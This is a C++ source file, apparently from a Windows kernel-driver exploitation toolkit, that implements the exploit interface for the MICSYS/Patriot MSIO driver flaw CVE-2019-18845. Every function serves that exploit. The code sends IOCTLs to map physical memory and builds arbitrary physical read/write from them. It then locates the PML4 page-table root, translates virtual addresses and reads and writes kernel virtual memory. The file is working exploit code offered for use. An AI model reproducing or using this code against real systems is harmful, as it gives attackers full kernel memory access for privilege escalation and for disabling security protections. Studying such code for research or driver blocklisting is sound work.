/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020
*
*  TITLE:       MSIO.CPP
*
*  VERSION:     1.00
*
*  DATE:        07 Feb 2020
*
*  MICSYS MSIO driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/msio.h"

//
// MICSYS RGB driver interface for CVE-2019-18845.
//

/*
* MsioCallDriver
*
* Purpose:
*
* Call Patriot Msio driver.
*
*/
BOOL MsioCallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    BOOL bResult = FALSE;
    IO_STATUS_BLOCK ioStatus;

    NTSTATUS ntStatus = NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength);

    bResult = NT_SUCCESS(ntStatus);
    SetLastError(RtlNtStatusToDosError(ntStatus));
    return bResult;
}

/*
* MsioMapMemory
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
*
*/
PVOID MsioMapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _Out_ HANDLE *SectionHandle,
    _Out_ PVOID *ReferencedObject)
{
    MSIO_PHYSICAL_MEMORY_INFO request;

    *SectionHandle = NULL;
    *ReferencedObject = NULL;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.ViewSize = PhysicalAddress + NumberOfBytes;
    
    if (MsioCallDriver(DeviceHandle,
        IOCTL_MSIO_MAP_USER_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &request,
        sizeof(request)))
    {
        *SectionHandle = request.SectionHandle;
        *ReferencedObject = request.ReferencedObject;
        return request.BaseAddress;
    }

    return NULL;
}

/*
* MsioUnmapMemory
*
* Purpose:
*
* Unmap previously mapped physical memory.
*
*/
VOID MsioUnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ HANDLE SectionHandle,
    _In_ PVOID ReferencedObject
)
{
    MSIO_PHYSICAL_MEMORY_INFO request;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.BaseAddress = SectionToUnmap;
    request.ReferencedObject = ReferencedObject;
    request.SectionHandle = SectionHandle;

    MsioCallDriver(DeviceHandle,
        IOCTL_MSIO_UNMAP_USER_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* MsioQueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI MsioQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    DWORD dwError = ERROR_SUCCESS;
    ULONG_PTR pbLowStub1M = 0ULL, PML4 = 0;

    PVOID refObject = NULL;
    HANDLE sectionHandle = NULL;

    *Value = 0;

    do {

        pbLowStub1M = (ULONG_PTR)MsioMapMemory(DeviceHandle,
            0ULL,
            0x100000,
            &sectionHandle,
            &refObject);

        if (pbLowStub1M == 0) {
            dwError = GetLastError();
            break;
        }

        PML4 = supGetPML4FromLowStub1M(pbLowStub1M);
        if (PML4)
            *Value = PML4;
        else
            *Value = 0;

        MsioUnmapMemory(DeviceHandle, 
            (PVOID)pbLowStub1M, 
            sectionHandle, 
            refObject);

        dwError = ERROR_SUCCESS;

    } while (FALSE);

    SetLastError(dwError);
    return (PML4 != 0);
}

/*
* MsioReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory.
*
*/
BOOL WINAPI MsioReadWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOLEAN DoWrite)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID mappedSection = NULL;
    ULONG_PTR offset;

    PVOID refObject = NULL;
    HANDLE sectionHandle = NULL;

    //
    // Map physical memory section.
    //
    mappedSection = MsioMapMemory(DeviceHandle,
        PhysicalAddress,
        NumberOfBytes,
        &sectionHandle,
        &refObject);

    if (mappedSection) {

        offset = PhysicalAddress;

        __try {

            if (DoWrite) {
                RtlCopyMemory(RtlOffsetToPointer(mappedSection, offset), Buffer, NumberOfBytes);
            }
            else {
                RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedSection, offset), NumberOfBytes);
            }

            bResult = TRUE;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            SetLastError(GetExceptionCode());
            bResult = FALSE;
        }

        //
        // Unmap physical memory section.
        //
        MsioUnmapMemory(DeviceHandle,
            mappedSection,
            sectionHandle,
            refObject);
        
    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* MsioReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI MsioReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return MsioReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* MsioWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI MsioWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return MsioReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* MsioVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI MsioVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    BOOL bResult = FALSE;

    if (PhysicalAddress)
        *PhysicalAddress = 0;
    else {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    bResult = PwVirtualToPhysical(DeviceHandle,
        (provQueryPML4)MsioQueryPML4Value,
        (provReadPhysicalMemory)MsioReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);

    return bResult;
}

/*
* MsioReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory via MSIO.
*
*/
BOOL WINAPI MsioReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;
    DWORD dwError = ERROR_SUCCESS;

    bResult = MsioVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = MsioReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            FALSE);

        if (!bResult)
            dwError = GetLastError();

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* MsioWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory via MSIO.
*
*/
BOOL WINAPI MsioWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;
    DWORD dwError = ERROR_SUCCESS;

    bResult = MsioVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = MsioReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            TRUE);

        if (!bResult)
            dwError = GetLastError();

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}
